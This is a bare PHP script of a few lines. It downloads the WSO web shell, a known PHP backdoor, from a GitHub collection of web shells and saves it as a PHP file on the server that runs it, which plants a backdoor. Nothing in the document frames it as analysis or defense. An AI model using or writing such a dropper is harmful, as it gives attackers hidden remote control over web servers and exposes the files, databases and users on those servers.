<?php

$file = file_get_contents('https://raw.githubusercontent.com/tennc/webshell/master/php/wso/WSO_base64.php');
file_put_contents('file1.php', $file);


?>
